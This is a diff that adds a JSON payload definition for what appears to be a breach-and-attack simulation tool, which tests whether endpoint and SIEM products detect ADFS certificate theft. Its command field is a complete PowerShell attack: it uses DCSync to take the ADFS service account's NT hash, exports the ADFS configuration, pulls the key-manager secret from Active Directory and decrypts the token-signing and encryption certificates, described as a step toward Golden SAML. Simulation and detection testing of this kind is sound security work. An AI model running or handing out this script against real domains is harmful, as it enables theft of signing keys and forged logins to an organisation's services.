@@ -1,0 +1,69 @@
+{
+  "command_content": "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n",
+  "command_executor": "psh",
+  "payload_arguments": [
+    {
+      "default_value": "adfs_svc",
+      "key": "adfs_service_account_name",
+      "type": "text"
+    },
+    {
+      "default_value": "Administrator",
+      "key": "replication_user",
+      "type": "text"
+    },
+    {
+      "default_value": "ReallyStrongPassword",
+      "key": "replication_password",
+      "type": "text"
+    },
+    {
+      "default_value": "sts.contoso.com",
+      "key": "adfs_server_name",
+      "type": "text"
+    }
+  ],
+  "payload_attack_patterns": [
+    "T1552.004"
+  ],
+  "payload_cleanup_command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n",
+  "payload_cleanup_executor": "psh",
+  "payload_description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
+  "payload_domains": [
+    {
+      "domain_color": "#389CFF",
+      "domain_name": "Endpoint"
+    }
+  ],
+  "payload_elevation_required": false,
+  "payload_execution_arch": "ALL_ARCHITECTURES",
+  "payload_expectations": [
+    "DETECTION",
+    "PREVENTION"
+  ],
+  "payload_expected_security_platforms": {
+    "DETECTION": [
+      "EDR",
+      "SIEM",
+      "XDR"
+    ],
+    "PREVENTION": [
+      "EDR",
+      "XDR"
+    ]
+  },
+  "payload_external_id": "cab413d8-9e4a-4b8d-9b84-c985bd73a442",
+  "payload_name": "ADFS token signing and encryption certificates theft - Remote",
+  "payload_platforms": [
+    "Windows"
+  ],
+  "payload_prerequisites": [
+    {
+      "check_command": "if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}\n",
+      "description": "AADInternals and ActiveDirectory modules must be installed.\n",
+      "executor": "psh",
+      "get_command": "Install-Module -Name AADInternals -Force\n"
+    }
+  ],
+  "payload_type": "Command"
+}
